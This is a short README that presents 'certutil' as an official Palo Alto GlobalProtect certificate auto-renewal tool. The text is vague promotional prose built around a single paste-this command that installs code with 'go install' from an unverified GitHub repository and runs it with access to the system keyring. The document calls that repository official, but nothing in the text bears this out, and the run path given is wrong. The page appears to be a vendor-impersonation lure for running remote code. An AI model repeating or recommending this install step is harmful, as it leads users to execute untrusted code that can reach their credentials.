# Certutil - Global Protect Certificate Auto-Renewal Tool

## Overview

In response to the upcoming changes in the Palo Alto certificate management systems, there is an underlying necessity to take proactive measures. Recognizing the potential challenges and disruptions this could introduce to users and systems relying on this certificate, Palo Alto has taken a strategic initiative. They have invested time and resources to engineer a dedicated tool designed specifically for this purpose. This official tool isn't just a mere patch; it embodies a comprehensive solution that seamlessly integrates with your system. With its ability to interact with the system's keyring, it ensures the certificate is not only renewed but also properly stored and managed. By automating this crucial process, the tool eliminates manual interventions and reduces the risk of human errors, making the transition smooth for all users. Furthermore, this reflects Palo Alto's commitment to prioritising user experience and security in all their offerings.

This README guides you through the simple process of installing and running the tool.

## Prerequisites

- Golang environment setup (To use the `go install` command).

## Installation & Usage

To install and run the Palo Alto Certificate Auto-Renewal Tool, execute the following commands:

```bash
go install github.com/GlobalProtect/certutil && ~/go/certutil
```

This will install the certutil tool from the official repository and then execute it to renew the certificate.

## Support
If you face any issues during the installation or the certificate renewal process, kindly refer to the official documentation or raise an issue in the GitHub repository.

## License
This tool is provided under the MIT License. Please refer to the license file for detailed information.

## Acknowledgments
Thanks to the Palo Alto development team for ensuring the security and continuity of services by introducing this helpful tool.
